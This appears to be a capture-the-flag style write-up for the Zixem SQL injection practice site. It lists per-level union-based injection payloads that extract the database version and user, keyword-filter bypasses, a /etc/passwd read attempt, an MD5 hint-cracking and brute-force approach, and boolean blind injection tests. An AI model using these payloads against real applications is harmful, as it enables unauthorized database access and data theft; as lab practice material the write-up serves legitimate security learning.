## Zixem SQLi

[[Zixem SQLi](http://www.zixem.altervista.org/SQLi/)]

> #### RULES
>
> Use only **UNION BASED!**
>
> Your mission is to select only the **version** & **user** and to **take screenshot** as proof.

## Write Up

#### SQLi challenges

| [Level 1](http://www.zixem.altervista.org/SQLi/level1.php?id=1) | Super Easy |
| ------- | ---------- |

 `?id=-9999 union select version(),user(),3; --`

| [Level 2](http://www.zixem.altervista.org/SQLi/level2.php?showprofile=4) | Easy |
| ------- | ---------- |

 `?showprofile=-9999' union select user(),version(),3,4 -- -`

| [Level 3](http://www.zixem.altervista.org/SQLi/level3.php?item=3) | Medium |
| ------- | ---------- |

 `?item=-9999' unionon select user(),version(),3,4; -- -`

| [Level 4](http://www.zixem.altervista.org/SQLi/level4.php?ebookid=7) | Normal |
| ------- | ---------- |

 `?ebookid=-9999' union select user(),version(),3,4,5; -- -`

| [Level 7](http://www.zixem.altervista.org/SQLi/level7.php?id=1) | Medium |
| ------- | ---------- |

In viewsource mode:
 
 `?id=-9999 union select 1,user(),3 ; -- -`
 
 `?id=-9999 union select 1,version(),3 ; -- -`

| [Level 8](http://www.zixem.altervista.org/SQLi/lvl8.php?id=1) | Hard |
| ------- | ---------- |

 `?id=(-9999)UNION(SselectELECT(user()),version(),3)`

| [Level 9](http://www.zixem.altervista.org/SQLi/lvl9.php?id=1) | Medium |
| ------- | ---------- |

 `?id=-9999' union select('../etc/passwd'),2 ; -- -`

| [Level 10](http://www.zixem.altervista.org/SQLi/lvl10.php?x=ISwwYGAKYAo%3D) | Pro |
| ------- | ---------- |

#### BF challenges

| [Level 5](http://www.zixem.altervista.org/SQLi/login_lvl5.php) | Hard |
| ------- | ---------- |

First, viewsource this login page and scroll down to end, we will find those red lines.

```
If you want hint, enter this password.
------
~~~~~~~~~~~~~~~~~~ password: d1fd6ef9af6cb677e09b1b0a68301e0c ~~~~~~~~~~~~~~~~~~~~~~
You can use my md5Cracker .
~~~~~~~~~~~~~~~~~~~~~~~~here: md5cracker.php~~~~~~~~~~~~~~~~~
```
Then enter this url `http://www.zixem.altervista.org/SQLi/md5cracker.php?hash=d1fd6ef9af6cb677e09b1b0a68301e0c` and we find the first password. Enter it to login page and get hint.

Now we know the passwords contains **only numbers**. Let's make some [code](https://github.com/TraiOi/Wargame_WriteUp/blob/master/Zixem/Zixem_SQLi/bruteforce.py) to bruteforce the login page.

Then we get the password, login and see the result.

#### SQLi-Blind challenges

| [Level 6](http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10) | Expererinced |
| ------- | ---------- |

Test the url:

 `?serial=10 and 1=1` return True
 
 `?serial=10 and 1=0` return False
 
Yes, then we know this is Boolean-based Blind SQL Injection.

All we have:

 * Table : teachers
 
 * Columns : teacher, price, age
 
